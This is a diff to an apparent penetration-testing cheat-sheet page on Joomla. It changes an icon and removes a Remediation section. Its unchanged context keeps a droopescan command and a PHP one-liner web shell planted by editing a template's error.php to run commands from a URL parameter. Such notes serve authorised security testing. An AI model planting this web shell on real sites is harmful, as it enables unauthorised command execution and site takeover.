@@ -3,7 +3,7 @@ tags:
   - Web
 ---
 
-# :material-joomla: Joomla
+# :simple-joomla: Joomla
 
 <span class="pill pill-medium">CMS</span> <span class="pill pill-info">web</span>
 
@@ -37,11 +37,6 @@ droopescan scan joomla -u http://$TARGET
 # Extensions → Templates → Customise → edit an active template's PHP (e.g. error.php)
 #   <?php system($_GET['c']); ?>  → /templates/<tpl>/error.php?c=id
 ```
-
-## :material-shield-check: Remediation
-
-- Patch core; strong admin creds + 2FA; restrict `/administrator` by IP;
-  disable the public config API.
 
 ## :material-link-variant: Related
 
